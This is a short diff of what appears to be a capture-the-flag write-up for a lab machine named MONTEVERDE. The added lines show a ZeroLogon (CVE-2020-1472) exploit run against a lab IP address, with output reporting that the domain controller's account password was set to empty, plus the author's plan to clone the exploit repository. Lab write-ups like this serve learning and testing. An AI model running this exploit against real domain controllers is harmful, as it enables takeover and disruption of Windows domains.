@@ -391,5 +391,17 @@ ZEROLOGON   10.129.35.54    445    MONTEVERDE       Next step: https://github.co
 I was right!
 
 ```python
+python3 cve-2020-1472-exploit.py MONTEVERDE 10.129.35.54
+Performing authentication attempts...
+=======================================================================================================================================
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit complete!
+```
+Ill go to the github repo and clone the repo, and then run the exploit!
+
+```python
 
 ```
